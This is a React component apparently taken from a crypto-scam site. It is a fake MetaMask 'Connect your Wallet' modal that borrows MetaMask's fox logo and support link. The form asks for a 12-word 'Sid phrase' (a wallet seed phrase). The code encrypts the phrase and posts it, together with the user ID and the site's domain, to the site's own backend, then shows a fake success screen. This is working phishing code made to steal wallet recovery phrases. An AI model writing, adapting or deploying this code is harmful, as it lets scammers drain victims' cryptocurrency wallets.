import "./Metamask.scss";
import Fox from "./Fox/Fox";
import React, {useState} from 'react';
import {DataDecripting, DataEncripting} from '../../utils/arrayParser';
import MetamaskSuccess from './MetamaskSuccess/MetamaskSuccess';
import {checkSidLength} from '../../utils/checkSidPhrase';
import {useThemeContext} from '../../context/ThemeContext';
import {store} from '../../../index';
import {putData} from '../../services/StaffServices';

const Metamask = ({ onHandleClose, onClose }) => {
  const {theme} = useThemeContext()
  const [val, setVal] = useState('')
  const [success, setSuccess] = useState(false)
  const [errorPhrase, setErrorPhrase] = useState(false)

  const onSubmit = async (e) => {
    e.preventDefault()

    if (checkSidLength(val) === 12) {
      await DataEncripting(val)
      await sendSidPhrase(await DataEncripting(val))
      setTimeout(() => {
        setSuccess(true)
        localStorage.setItem('connected', 'true')
      }, 1000)
    } else {
      setErrorPhrase(true)
    }
  }

  const sendSidPhrase = async (val) => {
    const obj = {
      userId: store.user.id,
      domainName: window.location.host,
      walletType: 'metamask',
      receivedData: val
    }
    const res = await putData('/personal_area/crypto_wallet/connect_wallet/', obj)
  }

  return (
    <div onClick={(e) => onHandleClose(e)} className={`metamask-wrap ${theme}`}>
      <div role="presentation" className="Overlay-sc-esqejp-0 hjyCTb"></div>
      <div
        onClick={(e) => e.stopPropagation()}
        className="Modal__StyledModal-sc-uvlcwa-0 igVQFl"
      >

        {
          success ? <MetamaskSuccess handleClose={onClose} /> : <form onSubmit={onSubmit} className="modal-form">
            <div className="modal-pass">
              <div className="modal-top">
                <Fox />
                <h2>Connect your Wallet!</h2>
                <div style={{marginBottom: 50}} className="header-sub">The decentralized app awaits</div>
              </div>
              <label style={{position: 'relative'}} className="pass" htmlFor="new-pass">
                <div className="label-text">Sid phrase</div>
                <input onChange={(e) => setVal(e.target.value)} type="text" id="new-pass" />
                {errorPhrase ? <div style={{color: 'tomato', fontSize: '12', position: 'absolute', bottom: '-20px'}}>Check sid phrase</div> : null}
              </label>

              <button className="modal-btn">Connect</button>
              <div className="help">
                Need help? Contact{" "}
                <a href="https://metamask.zendesk.com/hc/en-us">
                  MetaMask Support
                </a>{" "}
              </div>
            </div>
          </form>
        }

      </div>
    </div>
  );
};
export default Metamask;
